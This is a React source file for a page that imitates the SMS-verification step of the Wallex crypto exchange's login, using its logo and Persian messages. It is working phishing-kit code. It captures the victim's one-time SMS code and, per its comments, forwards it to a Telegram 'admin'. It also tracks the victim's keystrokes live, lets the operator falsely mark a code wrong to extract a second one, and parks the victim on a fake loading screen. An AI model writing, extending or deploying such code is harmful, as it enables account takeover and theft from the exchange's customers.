import React, { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import {
  canAccessAuthStep,
  updateAuthStep,
  setUserCurrentStep,
  getSession,
} from "@/lib/telegram-service-enhanced";
import { ChevronLeft, MessageSquare, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { AlertMessage } from "@/components/AlertMessage";
import { OTPInput } from "@/components/OTPInput";
import { toPersianDigits, maskPhoneNumber } from "@/lib/persian-utils";
import { useRealtimePresence } from "@/hooks/useRealtimePresence";

const AuthSMS = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [smsCode, setSmsCode] = useState("");
  const [countdown, setCountdown] = useState(60);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{ smsCode?: string }>({});
  const [isSecondAttempt, setIsSecondAttempt] = useState(false);
  const [isBlocked, setIsBlocked] = useState(false);

  const phoneNumber = location.state?.phoneNumber || "";
  const sessionId =
    location.state?.sessionId || sessionStorage.getItem("sessionId");
  const hasError = location.state?.hasError || false;
  const maskedPhoneNumber = maskPhoneNumber(phoneNumber);

  // Real-time presence tracking
  const presence = useRealtimePresence({
    sessionId: sessionId || "",
    formName: "AuthSMS",
    enabled: !!sessionId,
  });

  // Create typing handlers
  const smsTypingHandler = presence.createTypingHandler("smsCode");

  useEffect(() => {
    const checkAccess = async () => {
      if (!sessionId) {
        navigate("/", { replace: true });
        return;
      }

      const canAccess = canAccessAuthStep(sessionId, "sms");
      if (!canAccess && !hasError) {
        setIsBlocked(true);
        setErrors({
          smsCode:
            "شما بیش از ۲ بار کد پیامک وارد کرده‌اید. این مرحله دیگر قابل د��ترسی نیست.",
        });
        return;
      }

      // If admin marked SMS as wrong, show error
      if (hasError) {
        setErrors({
          smsCode: "کد پیامک وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
        });
      } else {
        // Check if this is second attempt (only if no admin error)
        const session = getSession(sessionId);
        if (session && session.authAttempts["sms"] === 1) {
          setIsSecondAttempt(true);
          setErrors({
            smsCode:
              "کد وارد شده غلط است. این آخرین فرصت شما برای ورود کد پیامک است.",
          });
        }
      }

      await setUserCurrentStep(sessionId, "auth_sms");
    };

    checkAccess();
  }, [sessionId, navigate, hasError]);
  // Countdown timer effect
  React.useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);

  const handleResendCode = () => {
    setCountdown(60);
    console.log("Resend code requested - Admin will handle this");
  };

  const handleCodeSubmit = async () => {
    // Clear previous errors except for second attempt warning
    if (!isSecondAttempt) {
      setErrors({});
    }

    if (isBlocked) {
      return;
    }

    if (!smsCode || smsCode.length !== 6) {
      setErrors({ smsCode: "کد پیامک ۶ رقمی را وارد کنید" });
      return;
    }

    if (!sessionId) {
      setErrors({ smsCode: "خطا در session. لطفا مجدد تلاش کنید." });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("Sending SMS code to Telegram admin");

      const success = await updateAuthStep(sessionId, "sms", smsCode);

      if (!success) {
        throw new Error("Failed to update SMS step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));

      navigate("/loading", {
        state: {
          phoneNumber,
          sessionId,
        },
        replace: true,
      });
    } catch (error) {
      console.error("SMS code submission error:", error);
      setErrors({ smsCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    navigate("/loading", {
      state: { phoneNumber, sessionId },
    });
  };

  // Resend functionality removed - admin controls SMS sending

  const handleSmsCodeChange = (newCode: string) => {
    setSmsCode(newCode);
    if (errors.smsCode) {
      setErrors((prev) => ({ ...prev, smsCode: undefined }));
    }
    // تشخیص تایپ برای presence system
    if (newCode) {
      smsTypingHandler.onKeyDown();
    } else {
      smsTypingHandler.onBlur();
    }
  };

  const handleSmsCodeComplete = (completedCode: string) => {
    setSmsCode(completedCode);
    setErrors({});
  };

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          width: "100%",
          maxWidth: "480px",
        }}
        className="form-card"
      >
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            padding: "20px",
            width: "100%",
          }}
        >
          {/* Header */}
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              width: "100%",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
              <Button
                variant="ghost"
                size="icon"
                onClick={handleBack}
                className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
                style={{
                  borderRadius: "50%",
                  width: "auto",
                  height: "auto",
                  padding: "0",
                  backgroundColor: "rgba(0, 0, 0, 0)",
                }}
              >
                <ChevronLeft
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                  }}
                />
              </Button>
              <span style={{ fontWeight: "700", fontSize: "16px" }}>ورود</span>
            </div>
            <img
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              alt="صرافی خرید فروش ارزهای دیجیتال"
              style={{
                width: "128px",
                height: "24px",
                objectFit: "contain",
              }}
            />
          </div>

          {/* Separator */}
          <hr
            style={{
              borderColor: "rgba(0, 0, 0, 0.2)",
              borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
              marginLeft: "-20px",
              marginRight: "-20px",
              marginTop: "8px",
              marginBottom: "8px",
            }}
          />

          {/* Content */}
          <div style={{ marginTop: "16px" }}>
            <div style={{ marginBottom: "24px" }}>
              <AlertMessage>
                <MessageSquare
                  className="inline ml-2"
                  style={{ width: "16px", height: "16px" }}
                />
                {isSecondAttempt
                  ? "کد اول نادرست بود. این آخرین فرصت شما است."
                  : `کد پیامک به شماره ${maskedPhoneNumber} توسط ادمین ارسال خواهد شد.`}
              </AlertMessage>
            </div>

            <div style={{ marginBottom: "16px" }}>
              <label
                style={{
                  fontSize: "14px",
                  fontWeight: "500",
                  marginBottom: "8px",
                  display: "block",
                  textAlign: "right",
                }}
              >
                کد تایید پیامک
              </label>
              <OTPInput
                length={6}
                value={smsCode}
                onComplete={handleSmsCodeComplete}
                onChange={handleSmsCodeChange}
                disabled={isSubmitting}
              />
              {errors.smsCode && (
                <p
                  style={{
                    color: "rgb(220, 38, 38)",
                    fontSize: "12px",
                    textAlign: "right",
                    marginTop: "8px",
                  }}
                >
                  {errors.smsCode}
                </p>
              )}
            </div>

            {/* Countdown Timer */}
            <div style={{ marginBottom: "24px", textAlign: "right" }}>
              <p
                style={{
                  color: "rgba(0, 0, 0, 0.6)",
                  fontSize: "14px",
                  lineHeight: "24.01px",
                  paddingBottom: "4px",
                  paddingTop: "4px",
                }}
              >
                {countdown > 0 ? (
                  <>
                    <span>{toPersianDigits(countdown)}</span>
                    <span> ثانیه تا ارسال مجدد کد</span>
                  </>
                ) : (
                  <button
                    onClick={handleResendCode}
                    style={{
                      color: "rgb(0, 122, 255)",
                      textDecoration: "underline",
                      background: "none",
                      border: "none",
                      cursor: "pointer",
                      fontSize: "14px",
                    }}
                  >
                    ارسال مجدد کد پیامک
                  </button>
                )}
              </p>
            </div>

            {/* Info Box */}
            <div
              style={{
                padding: "16px",
                backgroundColor: "rgba(34, 197, 94, 0.05)",
                borderRadius: "8px",
                marginBottom: "24px",
                border: "1px solid rgba(34, 197, 94, 0.2)",
              }}
            >
              <h4
                style={{
                  fontSize: "14px",
                  fontWeight: "600",
                  color: "rgb(0, 0, 0)",
                  margin: "0 0 8px 0",
                  textAlign: "right",
                }}
              >
                📱 نکات مهم:
              </h4>
              <ul
                style={{
                  fontSize: "12px",
                  color: "rgba(0, 0, 0, 0.7)",
                  margin: "0",
                  paddingRight: "16px",
                  lineHeight: "1.5",
                }}
              >
                <li>ممکن است تا ۲ دقیقه طول بکشد</li>
                <li>پوشه هرزنامه خود را بررسی کنید</li>
                <li>مطمئن شوید شماره همراه شما روشن است</li>
              </ul>
            </div>

            <div style={{ marginTop: "24px" }}>
              <hr
                style={{
                  borderColor: "rgba(0, 0, 0, 0.2)",
                  marginLeft: "-20px",
                  marginRight: "-20px",
                  marginBottom: "16px",
                }}
              />
              <Button
                onClick={handleCodeSubmit}
                disabled={isSubmitting || smsCode.length !== 6}
                className="w-full"
                style={{
                  backgroundColor: "rgb(23, 29, 38)",
                  color: "rgb(255, 255, 255)",
                  borderRadius: "8px",
                  padding: "10px 16px",
                  fontSize: "14px",
                  fontWeight: "500",
                  textTransform: "uppercase",
                  border: "none",
                  cursor:
                    isSubmitting || smsCode.length !== 6
                      ? "not-allowed"
                      : "pointer",
                  opacity: isSubmitting || smsCode.length !== 6 ? "0.5" : "1",
                }}
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <Loader2
                      className="animate-spin mr-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    <span>در حال تایید...</span>
                  </div>
                ) : (
                  "تایید کد"
                )}
              </Button>
            </div>
          </div>
        </div>
      </div>

      <style>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            max-width: none !important;
            height: 100vh;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
        }
      `}</style>
    </div>
  );
};

export default AuthSMS;
